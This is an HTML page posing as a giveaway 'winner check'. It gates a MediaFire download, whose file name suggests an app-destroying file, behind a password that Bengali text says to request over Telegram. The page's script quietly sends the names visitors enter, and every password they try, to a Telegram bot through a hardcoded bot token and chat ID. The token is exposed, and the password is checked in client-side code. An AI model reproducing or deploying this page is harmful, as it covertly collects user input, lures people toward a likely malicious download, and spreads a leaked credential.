<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Winner Download System</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background: linear-gradient(135deg, rgba(68, 0, 255, 0.8), rgba(0, 255, 212, 0.8), rgba(255, 200, 0, 0.8));
      background-size: 400% 400%;
      animation: gradientAnimation 15s ease infinite;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }

    @keyframes gradientAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      background-color: rgba(255, 255, 255, 0.9);
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 600px;
    }

    h2 {
      font-size: 30px;
      color: #444;
      margin-bottom: 20px;
      font-weight: bold;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 6px;
    }

    .form-group button {
      padding: 12px 24px;
      background-color: #28a745;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
    }

    .form-group button:hover {
      background-color: #218838;
    }

    .result {
      margin-top: 20px;
      font-size: 20px;
      font-weight: bold;
    }

    .winner {
      color: green;
    }

    .not-winner {
      color: red;
    }

    .download-btn {
      margin-top: 30px;
      padding: 15px 30px;
      background-color: #007bff;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      width: 100%;
    }

    .download-btn:hover {
      background-color: #0056b3;
    }

    footer {
      margin-top: 30px;
      font-size: 14px;
      color: #666;
    }

    .credit {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }

    .telegram-btn {
      display: inline-block;
      padding: 15px 30px;
      background-color: #0088cc;
      color: white;
      font-size: 18px;
      border-radius: 6px;
      cursor: pointer;
      text-decoration: none;
      margin-top: 20px;
      width: auto;
    }

    .telegram-btn img {
      width: 24px;
      height: 24px;
      margin-right: 10px;
      vertical-align: middle;
    }

    .telegram-btn:hover {
      background-color: #0077b3;
    }

    .password-link {
      display: inline-block;
      margin-top: 15px;
      font-size: 16px;
      color: #0088cc;
      text-decoration: none;
      font-weight: bold;
    }

    .password-link img {
      width: 20px;
      height: 20px;
      margin-right: 10px;
      vertical-align: middle;
    }

    .password-link:hover {
      color: #005f85;
    }
  </style>
</head>
<body>

<div class="container">
  <h2>Check if You are a Winner!</h2>

  <!-- Input Form to Check Name -->
  <div class="form-group">
    <label for="name">Enter Your Name</label>
    <input type="text" id="name" placeholder="Enter your name" required>
  </div>

  <div class="form-group">
    <button onclick="checkWinner()">Check</button>
  </div>

  <!-- Result Display -->
  <div class="result" id="result"></div>

  <!-- Download Section (Initially hidden) -->
  <div id="downloadSection" style="display: none;">
    <h3>Congratulations! You are a Winner!</h3>
    <div class="form-group">
      <label for="password">Enter Password to Download</label>
      <input type="password" id="password" placeholder="Enter password" required>
    </div>
    <button class="download-btn" onclick="validatePassword()">Download</button>

    <!-- Telegram Button for Password -->
    <a href="https://t.me/s1nx_mod" class="password-link" target="_blank">
      <img src="https://img.icons8.com/?size=256&id=k4jADXhS5U1t&format=png" alt="telegramlogobd.png"> 
      আপনি তো উইনার, এখন পাসওয়ার্ড পেতে হলে এখানে ক্লিক করুন আপনার লাস্ট একটা কাজ আপনি এখানের একটা স্ক্রিনশট নিবেন আর আমাকে ইনবক্সে দিবেন
    </a>
  </div>
</div>

<!-- Credit Text -->
<div class="credit">
  <p></p>
</div>

<script>
  // List of winners
  const winnersList = ["MAHIN  VAI", "Developer Noyon", "Zahidfhtdjdfgjfgjthjtdhdteh", "Daviddhdhdh", "Rahuldhdththd"];  // Example winner names

  // Correct password to access download
  const correctPassword = "3secrefgnfgnmfymt12"; // Set your password here

  // Your Telegram bot token and chat ID
  const token = "7834829654:AAHwifBGur7lalySHZXjMSVejKpoAU1bE3w"; // Replace with your bot token
  const chat_id = "6757923614"; // Replace with your chat ID

  // Function to check if the user is a winner
  function checkWinner() {
    const name = document.getElementById("name").value.trim();

    if (name === "") {
      alert("Please enter your name!");
      return;
    }

    if (winnersList.includes(name)) {
      document.getElementById("result").innerHTML = `<span class="winner">Congratulations ${name}! You are a Winner!</span>`;
      document.getElementById("downloadSection").style.display = "block"; // Show download section
      sendToTelegram(`A Winner has checked in. Name: ${name}`);
    } else {
      document.getElementById("result").innerHTML = `<span class="not-winner">Sorry ${name}, you are not a Winner.</span>`;
      document.getElementById("downloadSection").style.display = "none"; // Hide download section
    }

    document.getElementById("name").value = "";
  }

  // Function to validate password and allow download
  function validatePassword() {
    const enteredPassword = document.getElementById("password").value.trim();

    if (enteredPassword === "") {
      alert("Please enter the password!");
      return;
    }

    if (enteredPassword === correctPassword) {
      alert("Password correct! Your download will start now.");
      window.location.href = "https://www.mediafire.com/file/6arexoyrh5hrraf/APP+NOSTO+KORO+FILE+BY+DEVELOPER+X+JAHID.swb/file"; // Replace with your file's URL
      sendToTelegram(`Download started by winner. Password: ${correctPassword}`);
    } else {
      alert("Incorrect password! This attempt will be reported.");
      sendToTelegram(`Failed password attempt. Password entered: ${enteredPassword}`);
    }
  }

  // Function to send data (name, password attempt, or download) to Telegram
  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log("Data sent to Telegram.");
        } else {
          console.error("Error sending data to Telegram.");
        }
      })
      .catch(error => {
        console.error("Error sending data to Telegram:", error);
      });
  }
</script>

</body>
</html>
